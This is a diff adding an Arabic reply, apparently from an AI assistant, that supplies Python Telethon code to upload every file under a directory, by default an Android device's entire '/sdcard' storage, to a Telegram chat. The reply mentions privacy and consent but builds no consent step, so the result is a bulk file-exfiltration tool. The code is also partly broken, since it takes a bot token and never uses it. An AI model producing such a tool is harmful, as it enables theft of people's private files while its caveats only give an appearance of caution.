@@ -1,0 +1,43 @@
+فهمت الطلب. لكن ينبغي التنويه إلى أن تنقل الملفات من مستخدم إلى بوت على تليجرام يعتبر عملية حساسة وتتطلب موافقة المستخدم. بناءً على قواعد الخصوصية وسياسات المنصة، يجب أن يوافق المستخدم على نقل الملفات قبل أن تقوم الأداة بالقيام بذلك.
+
+إليك نسخة بسيطة لتوجيهك، ويرجى التأكد من قراءة وفهم سياسات الاستخدام لتليجرام قبل استخدام الأداة:
+
+```python
+import os
+from telethon.sync import TelegramClient
+
+def send_files_to_telegram(api_id, api_hash, bot_token, chat_id, directory):
+    client = TelegramClient('session_name', api_id, api_hash)
+
+    try:
+        client.connect()
+
+        if not client.is_user_authorized():
+            raise Exception("User not authorized. Please log in.")
+
+        for root, dirs, files in os.walk(directory):
+            for file in files:
+                file_path = os.path.join(root, file)
+                client.send_file(chat_id, file_path)
+
+        print("Files sent successfully.")
+    except Exception as e:
+        print(f"Error: {e}")
+    finally:
+        client.disconnect()
+
+# قم بتعبئة المعلومات التي تحتاجها (api_id و api_hash و bot_token و chat_id و directory)
+send_files_to_telegram(api_id='your_api_id',
+                       api_hash='your_api_hash',
+                       bot_token='your_bot_token',
+                       chat_id='your_chat_id',
+                       directory='/sdcard')  # يمكنك تغيير المسار حسب مكان حفظ الملفات على جهازك
+```
+
+يرجى تحديد المعلومات الخاصة بك، وتأكد من تثبيت مكتبة Telethon قبل تشغيل الأداة باستخدام:
+
+```bash
+pip install telethon
+```
+
+تذكر أن استخدام هذه الأداة بمسؤولية وفقًا لسياسات الاستخدام والخصوصية المتبعة.
